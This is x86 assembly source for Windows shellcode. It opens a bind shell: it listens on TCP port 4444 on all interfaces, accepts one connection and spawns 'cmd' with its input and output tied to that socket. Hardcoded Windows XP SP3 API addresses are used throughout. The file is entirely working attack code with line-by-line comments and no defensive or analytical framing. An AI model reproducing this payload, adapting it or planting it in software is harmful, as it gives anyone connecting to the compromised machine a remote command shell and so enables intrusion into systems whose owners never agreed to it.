[BITS 32]

global _start

section .text

_start:
 
    ; clear direction flags
    cld

    ; WSAStartup() - initiates use of the Winsock DLL by a process
    xor eax, eax
    mov ax, 0x0190	; sizeof (struct WSAData) 
    sub esp, eax  	; allocate space for WSAData struct
    push esp 		; push pointer to WSAData struct
    push eax		; push the version parameter
    mov ebx, 0x71ab6a55	; ws2_32.dll WSAStartup WinXP SP3
    call ebx		; call WSAStartup

    ; sleep for 30 seconds
    xor eax, eax        ; zero out eax
    push eax		; bAlertable (False)
    mov ax, 0x7530	; move 30 seconds (30,000 ms) into AX
    push eax		; dwMilliseconds (30,000 mx)
    mov ebx, 0x7c802446 ; kernel32.dll/Sleep
    call ebx

    ; setup WS2_32.WSASocketA
    xor eax, eax            ; zero out eax
    push eax
    push eax		    ; dwFlags
    push eax		    ; g (group)
    push eax 		    ; lpProtocolInfo
    mov al, 6               ; put value 6 for IPPROTO_TCP
    push eax                ; protocol, if 0 the service provider will choose protocol
    mov al, 1               ; put value 1 for SOCK_STREAM
    push eax                ; push value on stack
    inc eax                 ; make value 2 for AF_INET
    push eax                ; push value on stack
    mov ebx, 0x71ab8b6a     ; ws2_32.dll/WSASocketA
    call ebx                ; call socket
    mov edi, eax            ; store returned socket in edi

    ; Setup sockaddr struct
    xor eax, eax
    push eax            ; INADDR_ANY
    push word 0x0F27    ; sockaddr.sin_port  4444
    add al, 2          	; sockaddr.sin_family     : AF_INET = 2
    push word ax        ; push ipv4 AF onto stack
    mov edx, esp	; save address of sockaddr_in struct onto stack

    ; Setup WS2_32.bind
    push byte 16       	; length
    push edx           	; pointer to s
    push edi           	; saved socket
    mov ebx, 0x71ab4480 ; address of bind
    call ebx           	; call bind

   ; Setup WS2_32.listen
   xor eax, eax
   push eax		; backlog is used for mulitple connections.  Only need one so set to zero
   push edi             ; saved socket
   mov ebx, 0x71ab8cd3  ; address of listen
   call ebx             ; call listen

   ; setup WS2_32.accept
   xor eax, eax            ; zero out eax
   push eax                ; Optional pointer to addr length
   push eax                ; Optional pointer to addr
   push edi                ; push saved socket
   mov ebx, 0x71ac1040     ; address of accept
   call ebx                ; call accept
   mov esi, eax            ; save the socket from the accept call

   ; Close the listening socket
   xor eax, eax
   push edi		   ; push the listening socket 
   mov ebx, 0x71ab3e2b	   ; address of closesocket
   call ebx		   ; call closesocket	

   ; setup pointer to cmd
   mov edx, 0x646d6363	; cmdd
   shr edx, 8		; cmd
   push edx		; push edx onto the stack
   mov ebx, esp		; point to "cmd"

   ; setup pointer to processinfo
   xor edx, edx
   xor ecx, ecx  	; clear out ecx
   mov cl, 0x04 
   loop1:
     push edx
   loop loop1
   mov edi, esp		; move pointer into ebx

   ; setup startupinfo 
   push esi		; hStdError - saved socket
   push esi		; hStdOutput - saved socket
   push esi		; hStdInput -saved socket
   push edx		; pReserved2 - NULL	
   push edx		; cbReserved2 -NULL
   xor eax, eax
   inc eax
   rol eax, 0x08			
   inc eax
   push eax		; dwFlags - STARTF_USESTDHANDLES 0x00000101
   push edx		; dwFillAttribute - NULL
   push edx		; dwYCountChars - NULL
   push edx		; dwXCountChars - NULL
   push edx		; dwYSize - NULL
   push edx		; dwXSize - NULL
   push edx		; dwY - NULL
   push edx		; dwX - NULL
   push edx		; pTitle - NULL
   push edx		; pDesktop - NULL
   push edx		; pReserved - NULL
   xor eax, eax
   add al, 0x44		; sizeof STARTUP_INFO
   push eax		; cb - size of structure
   mov eax, esp		; pStartupInfo

   ; CreateProcessA() 
   push edi		; pProcessInfo
   push eax		; pStartupInfo
   push edx		; CurrentDirectory - NULL
   push edx		; pEnvironment - NULL
   push edx		; CreationFlags - 0
   xor eax, eax
   inc eax
   push eax		; InheritHandles -TRUE - 1
   push edx		; pThreadAttributes -NULL
   push edx		; pProcessAttributes - NULL
   push ebx		; pCommandLine - pointer to "cmd"
   push edx		; ApplicationName - NULL
   mov eax, 0x7c80236b	; CreateProcessA WinXP SP3
   call eax

   ; WaitForSingleObject
   push edx  		; time to wait - 0=don't enter wait state
   push dword [edi]	; pProcessInfo (process handle)
   mov eax, 0x7c802530  ; kernel32.dll/WaitForSingleObject
   call eax		; call WaitForSingleObject

   ; Exit
   push eax
   mov ebx, 0x7c81cafa     ; ExitProcess(exitcode)
   call ebx

